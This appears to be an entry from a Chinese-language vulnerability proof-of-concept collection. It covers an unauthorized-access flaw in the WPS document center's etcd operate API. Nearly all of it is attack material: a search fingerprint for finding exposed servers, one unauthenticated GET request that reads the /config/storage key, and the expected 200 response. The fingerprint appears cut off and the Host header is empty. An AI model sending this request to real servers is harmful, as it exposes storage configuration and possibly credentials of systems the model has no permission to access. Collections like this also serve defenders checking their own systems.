# WPS文档中心etc-doperate存在未授权访问漏洞

WPS ｜ 未授权访问 ｜ —
- **指纹**：`body="content=\"`
- **请求**：`GET /open/v6/api/etcd/operate?key=/config/storage&method=get HTTP/1.1Host:`
- **响应特征**：200